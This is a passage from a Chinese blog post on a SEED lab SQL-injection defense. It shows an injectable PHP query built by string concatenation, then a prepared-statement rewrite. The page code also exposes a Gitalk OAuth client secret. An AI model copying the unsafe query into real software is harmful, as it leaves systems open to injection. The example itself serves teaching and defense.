<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT name, local, gender</span></span><br><span class="line"><span class="string">        FROM USER_TABLE</span></span><br><span class="line"><span class="string">        WHERE id = <span class="subst">$id</span> AND password =’<span class="subst">$pwd</span>’ &quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>)</span><br></pre></td></tr></table></figure>

<p>安全改写：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$stmt</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT name, local, gender</span></span><br><span class="line"><span class="string">                        FROM USER_TABLE</span></span><br><span class="line"><span class="string">                        WHERE id = ? and password = ? &quot;</span>);</span><br><span class="line"><span class="comment">// Bind parameters to the query</span></span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;is&quot;</span>, <span class="variable">$id</span>, <span class="variable">$pwd</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_result</span>(<span class="variable">$bind_name</span>, <span class="variable">$bind_local</span>, <span class="variable">$bind_gender</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">fetch</span>();</span><br></pre></td></tr></table></figure>

<blockquote>
<p>In the bind <code>param()</code> method, the first argument <code>is</code> indicates the types of the parameters: <code>i</code> means that the data in <code>$id</code> has the integer type, and <code>s</code> means that the data in <code>$pwd</code> has the string type.</p>
</blockquote>
<p>安全的登录页面：<code>http://www.seed-server.com/defense/</code></p>
<p>需要自行修改<code>unsafe.php</code>，然后自行rebuild以及restart容器</p>
	
		</div>
		
		<div id="current-post-cover" data-scr="/img/post-cover/SEEDbooks.jpg"></div>

		<!-- relate post, comment...-->
		<div class="investment-container">
			<div class="investment-header">
				<div class="investment-title-1">
					<div class="on">相关文章</div>
					<div>评论</div>
					<!-- <div>分享</div> -->
				</div>
				<div class="investment-title-2">	            
					
	<span>
		<a id="totop-post-page">返回顶部</a>
		
			<a href="/2023/03/30/sqli-labs-Stacked-Injections/" title="sqli-labs Stacked Injections" rel="prev">
				&laquo;上一篇
			</a>
		
		
			<a href="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/" title="《信息安全导论》配套练习与题解" rel="next">
				下一篇&raquo;
			</a>
			
	</span>


      		
				</div>	
			</div>
			
			<div class="investment-content">
				<div class="investment-content-list">
					

<div class="relate-post">
	
		<ul>
			
					<li>
						<div class="relate-post-text">
							<a class="relate-post-title" href="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/" title="《信息安全导论》配套练习与题解">
								《信息安全导论》配套练习与题解			
							</a>
							<p class="relate-post-date">
								<i class="fa fa-calendar"></i>
								二月 28日, 2023				
							</p>
							<p class="relate-post-content">
								&#x3D;&#x3D;目前只有前两大章的内容，最后一章网络安全还没看&#x3D;&#x3D;
01_Set-UID_ex
不可以，因为Bob own的Set-UID程序，运行时的有效uid是Bob

不行，还是因为有效uid为100...
							</p>
						</div>

						<div class="relate-post-cover">
							<a href="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/" title="《信息安全导论》配套练习与题解">				
								
								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/SEEDbooks.jpg" alt="《信息安全导论》配套练习与题解"/>
							</a>
						</div>
					</li>												
			
					<li>
						<div class="relate-post-text">
							<a class="relate-post-title" href="/2024/08/29/K8S%E9%9D%B6%E5%9C%BA-Kubernetes-Goat/" title="K8S靶场-Kubernetes Goat">
								K8S靶场-Kubernetes Goat			
							</a>
							<p class="relate-post-date">
								<i class="fa fa-calendar"></i>
								八月 29日, 2024				
							</p>
							<p class="relate-post-content">
								0 先验知识https://madhuakula.com/kubernetes-goat/docs/kubernetes-goat-architecture
0.1 K8S Goat架构
0.2 K8S介绍每个K8S集群至少有一个工作...
							</p>
						</div>

						<div class="relate-post-cover">
							<a href="/2024/08/29/K8S%E9%9D%B6%E5%9C%BA-Kubernetes-Goat/" title="K8S靶场-Kubernetes Goat">				
								
								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/K8S.jpg" alt="K8S靶场-Kubernetes Goat"/>
							</a>
						</div>
					</li>												
			
					<li>
						<div class="relate-post-text">
							<a class="relate-post-title" href="/2024/07/18/Linux-VFS/" title="Linux VFS">
								Linux VFS			
							</a>
							<p class="relate-post-date">
								<i class="fa fa-calendar"></i>
								七月 18日, 2024				
							</p>
							<p class="relate-post-content">
								七、Linux VFS



主要是VFS——虚拟文件系统：
提供了统一的文件模型（common file model），底层具体的文件系统负责具体实现这种文件模型

抽象，统一表示

7.0 统一文件模型文件存在硬盘上，硬盘的最小存...
							</p>
						</div>

						<div class="relate-post-cover">
							<a href="/2024/07/18/Linux-VFS/" title="Linux VFS">				
								
								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/Linux企鹅.png" alt="Linux VFS"/>
							</a>
						</div>
					</li>												
			
					<li>
						<div class="relate-post-text">
							<a class="relate-post-title" href="/2024/05/09/Golang%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="Golang学习笔记">
								Golang学习笔记			
							</a>
							<p class="relate-post-date">
								<i class="fa fa-calendar"></i>
								五月 9日, 2024				
							</p>
							<p class="relate-post-content">
								一、菜鸟&#x3D;&#x3D;学了基础中的基础语法&#x3D;&#x3D;
1.1 Go语言结构.go文件必须在非注释的第一行指明这个文件属于哪个包，如：package main
每一个可执行文件都必须包含main函数，一般来说都是...
							</p>
						</div>

						<div class="relate-post-cover">
							<a href="/2024/05/09/Golang%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="Golang学习笔记">				
								
								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/Golang.png" alt="Golang学习笔记"/>
							</a>
						</div>
					</li>												
			
					<li>
						<div class="relate-post-text">
							<a class="relate-post-title" href="/2024/04/08/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/" title="容器安全">
								容器安全			
							</a>
							<p class="relate-post-date">
								<i class="fa fa-calendar"></i>
								四月 8日, 2024				
							</p>
							<p class="relate-post-content">
								一、Docker安全概述Docker 自身是基于 Linux 的多种 Namespace 实现的，其中有一个很重要的 Namespace 叫作 User Namespace，User Namespace 主要是用来做容器内用户和主机的...
							</p>
						</div>

						<div class="relate-post-cover">
							<a href="/2024/04/08/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/" title="容器安全">				
								
								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/docker.jpg" alt="容器安全"/>
							</a>
						</div>
					</li>												
			
					<li>
						<div class="relate-post-text">
							<a class="relate-post-title" href="/2024/03/25/namespace%E3%80%81cgroup%E4%B8%8Ecapabilities/" title="namespace、cgroup与capabilities">
								namespace、cgroup与capabilities			
							</a>
							<p class="relate-post-date">
								<i class="fa fa-calendar"></i>
								三月 25日, 2024				
							</p>
							<p class="relate-post-content">
								一、namespace1.1 类型


Namespace
Flag
Page
Isolates



Cgroup
CLONE_NEWCGROUP
cgroup_namespaces(7)
Cgroup root directory...
							</p>
						</div>

						<div class="relate-post-cover">
							<a href="/2024/03/25/namespace%E3%80%81cgroup%E4%B8%8Ecapabilities/" title="namespace、cgroup与capabilities">				
								
								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/Linux企鹅.png" alt="namespace、cgroup与capabilities"/>
							</a>
						</div>
					</li>												
			
					<li>
						<div class="relate-post-text">
							<a class="relate-post-title" href="/2024/03/19/Docker%E5%9F%BA%E7%A1%80%E4%B8%8E%E6%9E%B6%E6%9E%84/" title="Docker基础与架构">
								Docker基础与架构			
							</a>
							<p class="relate-post-date">
								<i class="fa fa-calendar"></i>
								三月 19日, 2024				
							</p>
							<p class="relate-post-content">
								一、Docker进程与Linux进程Link: https://zhuanlan.zhihu.com/p/537982888
1.1 Linux的forkLinux：由父进程创建并执行子进程，创建通过fork完成，执行通过exec完成...
							</p>
						</div>

						<div class="relate-post-cover">
							<a href="/2024/03/19/Docker%E5%9F%BA%E7%A1%80%E4%B8%8E%E6%9E%B6%E6%9E%84/" title="Docker基础与架构">				
								
								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/docker.jpg" alt="Docker基础与架构"/>
							</a>
						</div>
					</li>												
			
					<li>
						<div class="relate-post-text">
							<a class="relate-post-title" href="/2023/07/07/Web%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86-SQLi/" title="Web漏洞整理-SQLi">
								Web漏洞整理-SQLi			
							</a>
							<p class="relate-post-date">
								<i class="fa fa-calendar"></i>
								七月 7日, 2023				
							</p>
							<p class="relate-post-content">
								[NOTE] SQLi前言主要是之前练习了很多靶场所设计到的SQLi的笔记都比较分散这里就系统地整理下，主要是整合到一起，方便以后查阅
整理自靶场练习Webgoat、pikachu、Web For Pentester、XVWA、sql...
							</p>
						</div>

						<div class="relate-post-cover">
							<a href="/2023/07/07/Web%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86-SQLi/" title="Web漏洞整理-SQLi">				
								
								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/WebVuln1.jpg" alt="Web漏洞整理-SQLi"/>
							</a>
						</div>
					</li>												
			
					<li>
						<div class="relate-post-text">
							<a class="relate-post-title" href="/2023/06/17/Linux%E6%94%BB%E9%98%B2-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%8F%8A%E7%97%95%E8%BF%B9%E9%9A%90%E8%97%8F/" title="Linux攻防-权限维持及痕迹隐藏">
								Linux攻防-权限维持及痕迹隐藏			
							</a>
							<p class="relate-post-date">
								<i class="fa fa-calendar"></i>
								六月 17日, 2023				
							</p>
							<p class="relate-post-content">
								零、Linux下的控守技术概述控守技术可以理解为权限维持技术，泛指攻击者获取目标机器的控制权限后，将该权限长久维持的技术和方法
这里主要分为两大类：

权限维持：能够在失去当前控制权限时，下次能更容易地重获权限的方法
痕迹隐藏：能够使...
							</p>
						</div>

						<div class="relate-post-cover">
							<a href="/2023/06/17/Linux%E6%94%BB%E9%98%B2-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%8F%8A%E7%97%95%E8%BF%B9%E9%9A%90%E8%97%8F/" title="Linux攻防-权限维持及痕迹隐藏">				
								
								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/Linux企鹅.png" alt="Linux攻防-权限维持及痕迹隐藏"/>
							</a>
						</div>
					</li>												
			
					<li>
						<div class="relate-post-text">
							<a class="relate-post-title" href="/2023/06/04/Web%E9%9D%B6%E5%9C%BA-upload-labs/" title="Web靶场-upload-labs">
								Web靶场-upload-labs			
							</a>
							<p class="relate-post-date">
								<i class="fa fa-calendar"></i>
								六月 4日, 2023				
							</p>
							<p class="relate-post-content">
								环境攻击机：kali 10.10.10.128靶机：Debian 11.1 x64 
Pass-01任务：上传一个webshell到服务器
直接怼，显示：

改成basic.jpg，点击上传后bp抓包，修改后缀为.php，上传成功了：...
							</p>
						</div>

						<div class="relate-post-cover">
							<a href="/2023/06/04/Web%E9%9D%B6%E5%9C%BA-upload-labs/" title="Web靶场-upload-labs">				
								
								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/default.jpg" alt="Web靶场-upload-labs"/>
							</a>
						</div>
					</li>												
			
		</ul>
	
</div>	
				</div>
				<div class="investment-content-list">
					<div class="layout-comment">

	

		

			<!-- gitalk comment -->
			<!-- show gitalk comment -->
<div id="gitalk-container"></div>

<!-- gitalk`s css & js -->
<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
<link rel="stylesheet" href="/css/comment.css">
<script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.min.js"></script>
<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>

<script type="text/javascript">

	(function gitalkComment(){
		//Thanks O-R
		//https://github.com/gitalk/gitalk/issues/102#issuecomment-382970552
		//去除尾部匹配正则数组的字符串  
		//Remove redundant characters
		String.prototype.trimEnd = function(regStr) {
			let result = this;
			if(regStr == undefined || regStr == null || regStr == "") {
				return result;
			}
			let array = regStr.split(',');

			if(array.length > 0) {

				let c = array.shift(), 
					str = this,
					i = str.length,
					rg = new RegExp(c),
					matchArr = str.match(rg);

				if(matchArr != undefined && matchArr != null && matchArr.length > 0) {
					let matchStr = matchArr[0].replace(/\\/g, "\\\\").replace(/\*/g, "\\*")
						.replace(/\+/g, "\\+").replace(/\|/g, "\\|")
						.replace(/\{/g, "\\{").replace(/\}/g, "\\}")
						.replace(/\(/g, "\\(").replace(/\)/g, "\\)")
						.replace(/\^/g, "\\^").replace(/\$/g, "\\$")
						.replace(/\[/g, "\\[").replace(/\]/g, "\\]")
						.replace(/\?/g, "\\?").replace(/\,/g, "\\,")
						.replace(/\./g, "\\.").replace(/\&/g, "\\&");
					matchStr = matchStr + '$';
					result = str.replace(new RegExp(matchStr), "");
				}

				if(array.length > 0) {
					return result.trimEnd(array.join())
				} else {
					return result;
				}
			}
		};

		//Create gitalk
		let gitalk = new Gitalk({
			clientID: 'Ov23liAb4iwJ1VAXeknf',
			clientSecret: 'dbb92e8b0d3419b2a395abc8331a12e38e330e6c',
			//id: window.location.pathname,
			//id: decodeURI(window.location.pathname),
			//id: (window.location.pathname).split("/").pop().substring(0, 49),
			id: decodeURI( md5( location.href.trimEnd('#.*$,\\?.*$,index.html$') ) ),
			repo: 'Blog-Gitalk',
			owner: 'ArcheriShade',
			admin: 'ArcheriShade',
			distractionFreeMode: 'true',
		})
		gitalk.render('gitalk-container');		
	})();
</script>

		
		
	

</div>
				</div>
				<!-- <div class="investment-content-list">
					<div class="layout-share">
	
	
		<div class="config-info">
			Please check the parameter of <b>comment</b> in config.yml of hexo-theme-Annie!
		</div>	
	
</div>


				</div> -->
			</div>	
		</div>
	</div>
</div>

<!-- show math formula -->



	 
	
<script src="/plugin/clipboard/clipboard.js"></script>

	<script>
		// Copy code !
	    function preprocessing() {
	        $("#article-content .highlight").each(function() {
	            $(this).wrap('<div id="post-code"></div>');
	        })

	        $("#article-content #post-code").each(function() {
	            $(this).prepend('<nav class="copy-nav"><span><i class="code-language"></i></span></nav>');
	        })

	        $("#article-content .copy-nav").each(function() {
	            let languageClass = $(this).next().attr('class'),
	                language = ((languageClass.length > 9) && (languageClass != null)) ? languageClass.substr(10) : "none"; //why 9? Need to check language?

	            $(this).find('.code-language').text(language);
	            $(this).append('<span class="copy-btn icon-paste"></span>');
	        });
	    }

		function copy() {
		    $('#article-content #post-code').each(function(i) {
		        let codeCopyId = 'codeCopy-' + i;

		        let codeNode = $(this).find('.code'),
		            copyButton = $(this).find('.copy-btn');

		        codeNode.attr('id', codeCopyId);
		        copyButton.attr('data-clipboard-target-id', codeCopyId);
		    })
   
			let clipboard = new ClipboardJS('.copy-btn', {
					target: function(trigger) {
						return document.getElementById(trigger.getAttribute('data-clipboard-target-id'));
					}
		      	});

			//pure js
			function showTooltip(elem, msg) {		   
				elem.setAttribute('aria-label', msg);
				elem.setAttribute('class', 'copy-btn icon-clipboard1');
				setTimeout(function() {
					elem.setAttribute('class', 'copy-btn icon-paste');
				}, 2000);
			}

			clipboard.on('success', function(e) {
			    e.clearSelection();
			    console.info('Action:', e.action);		   
			    console.info('Trigger:', e.trigger);
			    showTooltip(e.trigger, 'Copied!');   
			});
			
			clipboard.on('error', function(e) {
			    console.error('Action:', e.action);
			    console.error('Trigger:', e.trigger);
			});
		}
		
		(function copyCode(){
			if ($('.layout-post').length) {
			    preprocessing();
			    copy();
			} 
		})();
	</script>






<link rel="stylesheet" href="/plugin/fancybox/jquery.fancybox.css">


<script src="/plugin/fancybox/jquery.fancybox.js"></script>


<script type="text/javascript">
	(function gallerySet(){
		let titleID = $('.article-title a'),
			imageID = $('.article-content img'),
			videoID = $('.article-content video');
		
		let postTitle = titleID.text() ? titleID.text() : "No post title!";
		
		imageID.each(function() {
			let imgPath = $(this).attr('src'),
				imgTitle = $(this).attr('alt') ? $(this).attr('alt') : "No image description!";
		
			//给每个匹配的<img>元素打包, 即添加父元素<a>
			$(this).wrap('<a data-fancybox="gallery" data-caption="《 ' + postTitle + ' 》' + imgTitle + '"href="' + imgPath + '"> </a>');
		});
		
		videoID.each(function() {
			let videoPath = $(this).attr('src');
		
			//给每个匹配的<img>元素打包, 即添加父元素<a>
			$(this).wrap('<a data-fancybox href=" ' + videoPath + ' "> </a>');
		});
		
		//TODO：支持html5 video

		if($('#layout-post').length) {
			$('[data-fancybox="gallery"]').fancybox({
				loop: true,
				buttons: [
					"zoom",
					"share",
					"slideShow",
					"fullScreen",
					//"download",
					"thumbs",
					"close"
				],
				protect: true
			});
		}
	})();
</script>
		</main>

		<!--footer-->
		<footer>
	<div id="navigation-show">
		<ul id="global-nav">
	
		<li class="menu-home">
			<a href="/" class="menu-item-home" target="_blank">主页</a>
		</li>
		
	
		<li class="menu-archive">
			<a href="/archives" class="menu-item-archive" target="_blank">归档</a>
		</li>
		
	
		<li class="menu-categories">
			<a href="/categories" class="menu-item-categories" target="_blank">分类</a>
		</li>
		
	
		<li class="menu-tags">
			<a href="/tags" class="menu-item-tags" target="_blank">标签</a>
		</li>
		
	
		<li class="menu-about">
			<a href="/about" class="menu-item-about" target="_blank">关于</a>
		</li>
		
	
		<li class="menu-gallery">
			<a href="/gallery" class="menu-item-gallery" target="_blank">相册</a>
		</li>
		
	

	
		<li class="menu-search">
			<a href="javascript:;" class="popup-trigger">搜索</a>
		</li>
	
</ul>
	</div>

	<div class="copyright">
		<p>
			 
				&copy;2024, content by ArcheriShade. All Rights Reserved.
			
			
				<a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> Theme <a href="https://github.com/Sariay/hexo-theme-Annie" title="Annie" target="_blank" rel="noopener">Annie</a> by Sariay.
			
		</p>
		<p>
			

	<!-- busuanzi -->
	<!-- busuanzi -->



			<a href="javascript:zh_tran('s');" class="zh_click" id="zh_click_s">简体</a> 
			<a href="javascript:zh_tran('t');" class="zh_click" id="zh_click_t">繁體</a>				
		</p>
	</div>		
</footer>
		
	<!-- Local or hitokoto! -->

	
<script src="/plugin/motto/motto.js"></script>

	
	<script type="text/javascript">
		(function motto(){
			let mottoText = getMingYanContent().split('</br> - </br>'),
			
			mottoTextContent = mottoText[0]?mottoText[0]:'请刷新...',
			
			mottoTextFrom = mottoText[1]?mottoText[1]:'one/一个';
			
			mottoTextContent = mottoTextContent.trim().substring(0, 100);
		
			$("#motto-content").html( mottoTextContent);
			$("#motto-author").html( mottoTextFrom  );
		})();	
	</script>	



<!-- love effect -->


<!-- back to top -->

	<div id="totop">
	<span class="icon-circle-up"></span>
</div>



<!-- site analysis -->


	<!-- site-analysis -->
	
	
	
	
	
 

<!-- leancloud -->


	<!-- leancloud -->
	<!--
	时间：2018-11-27
	描述：
		文章访问量：visitors
		文章喜欢量：likes	
		文章排行榜：topNPost
		其他得说明：
			01-Cookie相关的函数 
				https://blog.csdn.net/somehow1002/article/details/78511541（Author：somehow1002）
			02-visitors相关的函数 
				https://blog.csdn.net/u013553529/article/details/63357382（Author：爱博客大伯）
				https://notes.doublemine.me/2015-10-21-为NexT主题添加文章阅读量统计功能.html（Author：夏末）
			03-topNPost相关的函数
				https://hoxis.github.io/hexo-next-read-rank.html（Author：hoxis）
			04-likes相关的函数，
				参考了01 & 02进行简单的设计与实现
-->


	

  

	<!--
	时间：2018-10-3
	描述：
		插件名称：hexo-generator-search-zip
		插件来源: https://github.com/SuperKieran/hexo-generator-search-zip
		代码参考：https://github.com/SuperKieran/TKL/blob/master/layout/_partial/search.ejs(Include: js & css)	
-->
<div class="popup search-popup local-search-popup scrollbar" >
	<div class="local-search-container">
		<span class="popup-btn-close">
      		ESC
   		</span>
		<div class="local-search-header">
			<div class="input-prompt">				
			</div>
			<input autocomplete="off" placeholder="Search..." type="text" id="local-search-input">
		</div>
		<div class="local-search-body">
			<div id="local-search-output"></div>
		</div>
		<div class="local-search-footer">
			<div class="topN-post">				
				
								
			</div>
		</div>
	</div>
</div>


<script src="/plugin/search/ziploader.js"></script>
<script src="/js/search.js"></script>


<script type="text/javascript">
	var search_path = 'search.json',
		zip_Path = '/search.zip',
		version_Path = '/searchVersion.txt',
		input_Trigger = 'auto',
		top_N = '2';

	themeLocalSearch({
		search_path, 
		zip_Path, 
		version_Path, 
		input_Trigger, 
		top_N
	});
</script>



<script src="/plugin/chinese/chinese.js"></script>
<script src="/plugin/imagelazyloader/yall.min.js"></script>
<script src="/plugin/imageloaded/imagesloaded.pkgd.min.js"></script>
<script src="/plugin/nicescroll/jquery.nicescroll.js"></script>
<script src="/plugin/resizediv/resizediv.js"></script>
<script src="/js/main.js"></script>

	</body>	
</html>